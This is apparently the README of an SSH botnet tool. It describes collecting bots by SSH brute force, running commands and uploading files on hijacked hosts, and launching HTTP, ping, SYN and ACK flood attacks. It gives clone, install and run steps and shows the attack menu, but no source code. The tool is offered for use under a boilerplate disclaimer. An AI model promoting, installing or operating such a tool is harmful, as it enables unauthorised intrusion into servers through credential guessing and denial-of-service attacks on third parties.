# kamiras-ssh-botnet

This project was made by kamiras. Feel free to use, change and ask everything that you want.

## Features

**Bot Collecting**

- [x] SSH Brute Force Attack

**Five Attack Methods**

- [x] Command Execution
- [x] HTTP/HTTPS Attack
- [x] PING Attack
- [x] SYN Attack
- [x] ACK Attack

**Bot Counting**

- [x] Bots Alive Function

**File Upload**

- [x] File Uploading via SSH

## Requirements

**Python 3.9 (64-bit)**

At least 1 **bot** to start the **Attack**

## Installation

```
git clone https://github.com/kamiras/kamiras-ssh-botnet.git
```


```
pip install paramiko
```

## Usage

Execute the **ssh.py** with **Python 3.9**: ( Don't use **sudo python ssh.py**, it won't work )
```
python ssh.py
```    
or
```
python3 ssh.py
```   

Then select the **option** that you want ( **Remember**, you need to have **some bots** before starting the attacks ):

```

            ██╗  ██╗ █████╗ ███╗   ███╗██╗██████╗  █████╗ ███████╗               
            ██║ ██╔╝██╔══██╗████╗ ████║██║██╔══██╗██╔══██╗██╔════╝               
            █████╔╝ ███████║██╔████╔██║██║██████╔╝███████║███████╗               
            ██╔═██╗ ██╔══██║██║╚██╔╝██║██║██╔══██╗██╔══██║╚════██║               
            ██║  ██╗██║  ██║██║ ╚═╝ ██║██║██║  ██║██║  ██║███████║               
            ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝               
███████╗███████╗██╗  ██╗    ██████╗  ██████╗ ████████╗███╗   ██╗███████╗████████╗
██╔════╝██╔════╝██║  ██║    ██╔══██╗██╔═══██╗╚══██╔══╝████╗  ██║██╔════╝╚══██╔══╝
███████╗███████╗███████║    ██████╔╝██║   ██║   ██║   ██╔██╗ ██║█████╗     ██║   
╚════██║╚════██║██╔══██║    ██╔══██╗██║   ██║   ██║   ██║╚██╗██║██╔══╝     ██║   
███████║███████║██║  ██║    ██████╔╝╚██████╔╝   ██║   ██║ ╚████║███████╗   ██║   
╚══════╝╚══════╝╚═╝  ╚═╝    ╚═════╝  ╚═════╝    ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝   
                                                                                 
           +------------------------------------------------------+
           |                                                      |
           |                    1) Bots Alive                     |
           |                                                      |
           |  2) Command Execution              3) File Upload    |
           |                                                      |
           |  4) HTTP/HTTPS Attack              5) PING Attack    |
           |                                                      |
           |  6) SYN Attack ( Best Attack )     7) ACK Attack     |
           |                                                      |
           |                    8) Bot Collect                    |
           |                                                      |
           +------------------------------------------------------+
```

If you are **Brute Forcing** or **Attacking** just press **Ctrl+C** to stop it

## Disclaimer

This tool is only for testing and academic purposes and can only be used where strict consent has been given. **Do not use it for illegal purposes**. It is the end user’s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this tool and software in general.
